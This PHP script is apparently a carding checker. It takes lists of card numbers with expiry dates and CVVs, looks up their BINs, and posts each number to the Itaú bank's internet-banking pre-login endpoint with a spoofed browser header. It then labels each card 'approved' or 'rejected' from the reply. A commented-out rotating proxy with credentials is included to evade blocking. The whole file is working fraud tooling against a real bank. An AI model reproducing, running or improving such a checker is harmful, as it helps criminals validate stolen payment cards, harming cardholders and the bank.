<?php
set_time_limit(0);
//error_reporting(0);

function getStr($string, $start, $end)
    {
      $str = explode($start, $string);
      $str = explode($end, $str[1]);
      return $str[0];
    }

    function multiexplode($delimiters, $string) {
      $one = str_replace($delimiters, $delimiters[0], $string);
      $two = explode($delimiters[0], $one);
      return $two;
  }
  
  
  $lista = $_GET['lista'];
  $cc = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[0];
  $mes = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[1];
  $ano = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[2];
  $cvv = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<", " "), $lista)[3];
  $time = time();
  $code = rand(001, 999);

function bin($cc)
{

    $contents = file_get_contents("bins.csv");
    $pattern = preg_quote(substr($cc, 0, 6) , '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches))
    {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(",", $encontrada);
    return "$pieces[4] $pieces[5] $pieces[1] $pieces[2] $pieces[3]";
}
$bin = bin($lista);



    function generateRandomString($length = 12) {
      $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
    }

if(strlen($ano) == 4){
  $ano = substr($ano, 2);
}

$cctwo =  substr($cc, 0,4).' '.substr($cc, 4,4).' '.substr($cc, 8,4).' '.substr($cc, 12);
$c1 = substr($cc, 0,4);
$c2 = substr($cc, 4,4);
$c3 = substr($cc, 8,4);
$c4 = substr($cc, 12,4);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://internetnc4.itau.com.br/router-app/router'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_HEADER, 1);
/*curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'zjlfgfvt-rotate:dxduco59vz08');*/
curl_setopt($ch, CURLOPT_POSTFIELDS, 'usuario.cartao='.$cc.'&usuario.cpf=&portal=999&pre-login=pre-login&destino=&tipoLogon=9');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
));
$inicio = curl_exec($ch);



if(strpos($inicio,'Print de exemplo, onde um cliente consulta sua fatura enviando mensagens para o Itaucard pelo WhatsAp')){
    echo "<span class='badge badge-success' style='color:white'>✔ Aprovada </span> ➔ </span><span class='badge badge-primary' style='color:white'> ".$cc."|".$mes."|20".$ano."|".$cvv." </span> ➜ <span class='badge badge-info' style='color:white'> " . $bin . " </span> ➜</span> <span class='badge badge-danger' style='color:white'> cartao bom mano abrace </span> ➜ <span class='badge badge-info' style='color:white'>Tempo:</span> ➜ <span class='badge badge-success' style='color:white'>by: @satp_1046 </span></h5><br>";


    // exit();
    // sleep(1);
}elseif(strpos($inicio,'Caso o erro continue, entre em contato com a central de atendimento.')){
    echo "<span class='badge badge-danger' style='color:white'>✖️ Reprovada  </span> ➔ </span><span class='badge badge-primary' style='color:white'>  ".$cc."|".$mes."|20".$ano."|".$cvv." </span> ➔ </span> <span class='badge badge-danger' style='color:white'> cartao invalido tiozao </span>➜ <span class='badge badge-info' style='color:white'>Tempo:  </span> ➜ <span class='badge badge-success' style='color:white'>by: @satp_1046 </span></h5><br>";

  }elseif(strpos($inicio,'403 Forbidden')){
    echo "<span class='badge badge-danger' style='color:white'>✖️ Reprovada  </span> ➔ </span><span class='badge badge-primary' style='color:white'>  ".$cc."|".$mes."|20".$ano."|".$cvv." </span> ➔ </span> <span class='badge badge-danger' style='color:white'> Forbidden  </span>➜ <span class='badge badge-info' style='color:white'>Tempo:  </span> ➜ <span class='badge badge-success' style='color:white'>by: @satp_1046 </span></h5><br>";
 
 

}else{ 
    echo "<span class='badge badge-danger' style='color:white'>✖️ Reprovada  </span> ➔ </span><span class='badge badge-primary' style='color:white'>  ".$cc."|".$mes."|20".$ano."|".$cvv." </span> ➔ </span> <span class='badge badge-danger' style='color:white'> ERROOR  </span>➜ <span class='badge badge-info' style='color:white'>Tempo:  </span> ➜ <span class='badge badge-success' style='color:white'>by: @satp_1046 </span></h5><br>";

}


